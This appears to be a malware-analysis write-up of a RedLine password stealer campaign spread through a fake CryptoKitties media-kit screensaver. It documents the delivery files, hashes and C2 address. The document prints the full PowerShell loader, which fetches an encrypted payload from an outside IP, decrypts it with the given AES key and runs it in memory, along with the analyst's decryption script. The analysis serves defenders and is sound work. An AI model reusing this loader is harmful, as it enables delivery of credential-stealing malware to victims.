### Initial Delivery Observed

The Redline password stealer was observed being distributed from mega.nz.

### Observed a password protected zip archive being downloaded and decompressed

```
Downloaded archive name:
C:\Users\redacted\Downloads\CryptoKitties's Advertising Assist Toolkit.zip

Unzipped fake screen saver:
"C:\Users\redacted\AppData\Local\Temp\Temp1_CryptoKitties's Advertising Assist Toolkit.zip\Media kit from CryptoKitties\30-second promotional video to integrate into YouTube video (28.12.2022).scr"
```

### Upon execution of the fake screensaver, a malicious powershell script is executed.
```ps
#Start-Sleep -Seconds 30;
#$arr1 = @(0)*1000*1000*100;
#Add-Type -AssemblyName System.Windows.Forms;
#[System.Windows.Forms.MessageBox]::Show('The version of the app is out of date, please update it at trovata.io','Error','OK','Error');
$payload_var = (Invoke-webrequest -URI 'http[:]//45.93.201[.]62/docs/xhyJ4fJAbLEIxipFLr2pTihuYL63Tk.txt' -UseBasicParsing).Content;
$payload_var = [System.Convert]::FromBase64String($payload_var);
$aes_var = New-Object System.Security.Cryptography.AesManaged;
$aes_var.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$aes_var.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$aes_var.Key = [System.Convert]::FromBase64String('8qUa2ZlKd3/9zH5ADWS/6DAzFdw9PDT/3S1buuvASfU=');
$aes_var.IV = [System.Convert]::FromBase64String('CXiCzScSRuiANJsvovXILg==');
$decryptor_var = $aes_var.CreateDecryptor();
$payload_var = $decryptor_var.TransformFinalBlock($payload_var, 0, $payload_var.Length);
$decryptor_var.Dispose();
$aes_var.Dispose();
$msi_var = New-Object System.IO.MemoryStream(, $payload_var);
$mso_var = New-Object System.IO.MemoryStream;
$gs_var = New-Object System.IO.Compression.GZipStream($msi_var, [IO.Compression.CompressionMode]::Decompress);
$gs_var.CopyTo($mso_var);
$payload_var = $mso_var.ToArray();
$obfstep1_var = [System.Reflection.Assembly]::Load($payload_var);
$obfstep2_var = $obfstep1_var.EntryPoint;
$obfstep2_var.Invoke($null, (, [string[]] (''))); #($null, $null);
#Start-Sleep -Seconds 500
$global:?
```

### A decryption script was created
```ps
# base64 blob was extracted from http[:]//45.93.201[.]62/docs/xhyJ4fJAbLEIxipFLr2pTihuYL63Tk.txt
$payload_var = [Convert]::FromBase64String([IO.File]::ReadAllText('xhyJ4fJAbLEIxipFLr2pTihuYL63Tk.txt'))
$aes_var = New-Object System.Security.Cryptography.AesManaged
$aes_var.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes_var.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes_var.Key = [System.Convert]::FromBase64String('8qUa2ZlKd3/9zH5ADWS/6DAzFdw9PDT/3S1buuvASfU=')
$aes_var.IV = [System.Convert]::FromBase64String('CXiCzScSRuiANJsvovXILg==')
$decryptor_var = $aes_var.CreateDecryptor()
$payload_var = $decryptor_var.TransformFinalBlock($payload_var, 0, $payload_var.Length)
$decryptor_var.Dispose()$aes_var.Dispose()
$msi_var = New-Object System.IO.MemoryStream(, $payload_var)
$mso_var = New-Object System.IO.MemoryStream
$gs_var = New-Object System.IO.Compression.GZipStream($msi_var, [IO.Compression.CompressionMode]::Decompress)
$gs_var.CopyTo($mso_var)$payload_var = $mso_var.ToArray()
[system.io.file]::writeallbytes("payload.dll", $payload_var)
```

### Decrypted .NET payload and C2 configuration
```
[Loads in memory]
File: payload.dll
Hash: fecee39cea4226d6ddf68bc0842e8418e46d4683743937be945c7c0a5c1ecec1

[unpacked redline]
xor key: Trisectrix
File: Unreverend.exe
Hash: 0771cbaeeaf394717f370eb0016207c3c5094bc560393f5f5695de0b4070e125
C2: 95.217.55.211:2138
```
